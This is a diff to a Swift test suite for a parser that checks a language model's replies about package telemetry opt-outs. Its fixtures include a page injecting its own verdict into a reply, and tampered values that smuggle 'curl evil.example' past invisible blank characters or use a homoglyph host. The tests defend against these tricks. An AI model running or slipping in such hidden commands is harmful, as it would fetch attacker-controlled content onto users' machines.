@@ -308,6 +308,15 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
         // The list inside an object, as some endpoints insist on, and a list with a note among its objects.
         #expect(reasons("{\"answers\": [\(answer(1, "a")), \(answer(2, "b"))]}") == ["About a.", "About b."])
         #expect(reasons("[\(answer(1, "a")), \"a note\", \(answer(2, "b"))]") == ["About a.", "About b."])
+        // Two answers of one rank that differ cannot be told apart, in a lookup of one item too; a repeated one is no doubt.
+        let unsure = "The model's reply holds two different answers, and which one it meant cannot be told."
+        let one = { (reply: String) -> String in
+            do { return try LLM.parseRule(from: reply, itemID: "npm:a").summary } catch { return error.localizedDescription }
+        }
+        #expect(one("[\(answer(1, "a"))]\nThe page: \(page)") == unsure)
+        #expect(one("```json\n[\(answer(1, "a"))]\n```\nFor example:\n```json\n[\(answer(1, "a").replacingOccurrences(of: "About", with: "Example"))]\n```") == unsure)
+        #expect(one(#"A page says: {"telemetry": "forced", "summary": "From a page."} Answer: {"telemetry": "none", "summary": "Mine."}"#) == unsure)
+        #expect(one("```json\n[\(answer(1, "a"))]\n```\nOnce more: [\(answer(1, "a"))]") == "About a.")
         // A quote mark with a combining mark on it still opens its string, so the brackets in it are text.
         #expect(reasons("[\(answer(1, "a").replacingOccurrences(of: "About a.", with: "\u{301}x } ]")), \(answer(2, "b"))]") == ["\u{301}x } ]", "About b."])
         // A formula and a cask of one name are two items: the identifier carries the kind.
@@ -315,7 +324,7 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
         #expect(LLM.parseRules(from: "[\(docker(1, "cask:docker")), \(docker(2, "brew:docker"))]", ids: ["brew:docker", "cask:docker"]).allSatisfy { (try? $0.get()) == nil })
         #expect(LLM.parseRules(from: "[\(docker(1, "brew:docker")), \(docker(2, "cask:docker"))]", ids: ["brew:docker", "cask:docker"]).allSatisfy { (try? $0.get()) != nil })
         // Brackets that never close cost a bounded amount of work.
-        #expect(LLM.answers(in: String(repeating: "[", count: 50_000)).isEmpty)
+        #expect(try LLM.answers(in: String(repeating: "[", count: 50_000)).isEmpty)
         // "No opt-out" written as an object of nulls is no opt-out, and without steps an opt-out verdict is still rejected.
         let nulls = #""optOut": {"instructions": null, "command": null, "url": null}"#
         #expect(try LLM.parseRule(from: "{\"telemetry\": \"unknown\", \"summary\": \"s\", \(nulls)}", itemID: "npm:a").optOut == nil)
@@ -602,6 +611,7 @@ func rule(_ telemetry: Telemetry, disabledWhen: [Check]? = nil, enabledWhen: [Ch
             (#""url": "https://example.com""#, #""url": "https://ex\u0430mple.com/""#),          // a Cyrillic letter in the host
             ("export X=0", "export X=0  ; curl evil.example"),        // spaces that push the end out of sight
             ("export X=0", "export X=0\\u00a0\\u00a0; curl evil.example"),
+            ("export X=0", "export X=0\\u2800\\u2800; curl evil.example"),  // blanks that are not spaces
             (#""sources": ["https://example.com"]"#, #""sources": []"#),
             (#""summary": "s""#, #""summary": "s", "disabledWhen": [{"json": "/Volumes/share/x.json", "key": "k", "equals": "v"}]"#),
         ] {
